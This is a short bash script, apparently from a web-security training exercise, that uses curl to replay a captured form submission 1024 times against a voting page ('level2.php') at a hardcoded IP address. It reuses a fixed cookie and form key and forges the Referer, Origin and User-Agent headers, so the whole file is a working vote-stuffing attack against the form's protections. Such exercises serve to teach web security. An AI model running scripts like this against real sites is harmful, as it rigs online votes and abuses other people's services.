#!/bin/bash
for i in `seq 1 1024`
do
	curl 'http://173.246.108.142/level2.php' -H 'Cookie: HoldTheDoor=ca9edae8e687606348680a5c6e4c7ea10b60fa74' -H 'Origin: http://173.246.108.142' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: http://173.246.108.142/level2.php' -H 'Connection: keep-alive' --data 'id=1&holdthedoor=Submit&key=ca9edae8e687606348680a5c6e4c7ea10b60fa74' --compressed
done
